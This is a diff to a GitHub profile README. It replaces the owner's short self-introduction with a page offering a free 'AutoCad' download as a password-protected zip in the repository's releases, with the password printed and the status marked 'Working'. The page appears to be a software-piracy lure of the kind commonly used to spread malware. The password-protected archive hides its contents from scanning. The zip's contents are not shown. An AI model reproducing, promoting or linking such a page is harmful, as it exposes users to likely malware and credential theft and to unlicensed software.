@@ -1,7 +1,12 @@
-- 👋 Hi, I’m @Manjunatha N
-- 👀 I’m interested in ...Full Stack Web Development
-- 🌱 I’m currently learning ...Python,javscript,html,c,css
-<!---
-codinghubindia/codinghubindia is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+# AutoCad
+![MainIMG](https://i.ytimg.com/vi/z5G8invsSgE/maxresdefault.jpg)
+## Info ℹ️
+
+**📅 25.02.2024 📅**
+
+**✅ Status: Working ✅**
+
+**🔓 Password: autocad2024🔓**
+
+
+## Link to download | AutoCad(https://github.com/codinghubindia/codinghubindia/releases/download/AutoCad/autocad.zip)
